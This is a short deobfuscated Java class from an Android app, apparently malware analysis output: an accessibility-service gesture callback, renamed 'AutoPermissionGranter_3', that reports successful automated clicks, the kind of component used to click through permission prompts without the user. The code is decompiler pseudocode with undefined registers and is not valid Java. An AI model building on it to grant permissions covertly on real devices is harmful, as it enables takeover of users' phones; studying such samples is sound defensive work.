package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AutoPermissionGranter_3
 * Original: Lcom/tencent/Perf_tunesxconcerningn10_ect$3;
 */
class AutoPermissionGranter_3 extends AccessibilityService$GestureResultCallback {

    // === FIELDS ===
    final AutoClickExecutor val$clickByGestureCallback;

    // === METHODS ===

     void Constructor(AutoClickExecutor param0) {
        v0.val$clickByGestureCallback = v1;
        // new AccessibilityService$GestureResultCallback()
        return;
    }

    public void onCancelled(GestureDescription param0) {
        v0.onCancelled(v1);
        return;
    }

    public void onCompleted(GestureDescription param0) {
        v0.onCompleted(v1);
        v1 = v0.val$clickByGestureCallback;
        v1.onClickSuccess();
        return;
    }
}
